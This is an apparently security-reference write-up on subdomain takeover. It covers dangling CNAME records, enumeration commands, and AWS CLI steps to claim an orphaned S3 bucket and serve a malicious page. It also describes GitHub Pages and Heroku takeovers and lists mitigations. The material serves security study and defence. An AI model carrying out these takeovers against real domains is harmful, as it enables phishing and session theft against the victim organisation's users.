📌 Subdomain Takeover

🧠 Description

What is the vulnerability?

A DNS CNAME record points to an external service (e.g., AWS S3, GitHub Pages, Heroku, Azure, Shopify) that is no longer in use. An attacker claims the resource and hosts malicious content on the victim’s subdomain, enabling phishing, XSS, or session theft.

Why does it occur?

Organisations forget to remove DNS records after decommissioning external services.

Security principle violated: Asset Management / Supply Chain

Real-world analogy: A company changes its address but leaves a forwarding notice at the old location – anyone can redirect visitors to a fake office.

🏷️ Classification

  • Type: Configuration Weakness / Broken Access Control
  • OWASP: A01:2021 – Broken Access Control (can lead to session hijacking)
  • CWE: CWE-923: Improper Restriction of Communication Channel to Intended Endpoints

🎯 Attack Surface

  • ✅ AWS S3 buckets (CNAME to bucket-name.s3.amazonaws.com)
  • ✅ GitHub Pages (username.github.io)
  • ✅ Heroku (app-name.herokuapp.com)
  • ✅ Azure CDN / Storage
  • ✅ Shopify / WordPress.com
  • ✅ Zendesk / Freshdesk

🔍 Detection Methodology

# Enumerate subdomains (subfinder, assetfinder, amass)
subfinder -d target.com -o subs.txt

# Check each subdomain for dangling CNAME
for sub in $(cat subs.txt); do
  cname=$(dig +short CNAME $sub)
  if [[ $cname == *"s3.amazonaws.com"* ]] || [[ $cname == *"github.io"* ]]; then
    echo "$sub -> $cname"
    # Check if resource exists
    curl -I http://$sub
  fi
done

# Automated tools: subzy, tko-subs, nuclei
subzy -targets subs.txt
nuclei -t takeover/ -l subs.txt

💣 Basic Payloads (Example: AWS S3)

# If CNAME points to bucket-name.s3.amazonaws.com and bucket is not owned
# Create bucket with same name in your AWS account
aws s3 mb s3://bucket-name

# Upload a malicious index.html
aws s3 cp index.html s3://bucket-name/

# Now victim's subdomain serves your content

🚀 Advanced Exploitation

# GitHub Pages takeover
# If CNAME points to username.github.io and user deleted their repo
# Create a GitHub account with same username and create a repo

# Heroku takeover
# If CNAME points to app-name.herokuapp.com and app is deleted
# Create a Heroku app with same name

# Once claimed, host a phishing page that steals cookies/session tokens
# Because it's on the same parent domain, cookies may be sent

⚙️ Exploitation Steps

  1. Discover subdomains (DNS enumeration, certificate transparency).
  2. Check each subdomain's CNAME record.
  3. If CNAME points to an external service, check if that service resource exists.
  4. If the resource does not exist (e.g., S3 bucket deleted, GitHub repo removed), claim it.
  5. Host malicious content (phishing page, XSS payload, session stealer).
  6. Wait for users to visit the subdomain (or lure them via social engineering).

🛡️ Mitigation

✅ Regularly audit DNS records (quarterly).
✅ Remove unused CNAME records immediately after decommissioning services.
✅ Use AWS CloudFront or ALB with custom domain validation to prevent takeover.
✅ Monitor for orphaned resources (use tools like ScoutSuite, CloudSploit).
✅ Implement a DNS cleanup policy.

🔓 Mitigation Bypass

  • If the external service allows claiming without domain verification (e.g., old S3 buckets).
  • If the service has a grace period after deletion – attackers can claim during that window.

⚠️ Risk / Impact

Severity: High

Impact: Phishing attacks, session theft, XSS on parent domain (if cookie scoping is loose), brand reputation damage, stealing API keys.

📎 Proof of Concept (PoC)

# Check for vulnerable subdomain
dig sub.example.com

# If response shows CNAME to unclaimed service, takeover is possible
sub.example.com. 300 IN CNAME unclaimed-bucket.s3.amazonaws.com.

# Create bucket and upload
aws s3 mb s3://unclaimed-bucket
echo '' > index.html
aws s3 cp index.html s3://unclaimed-bucket
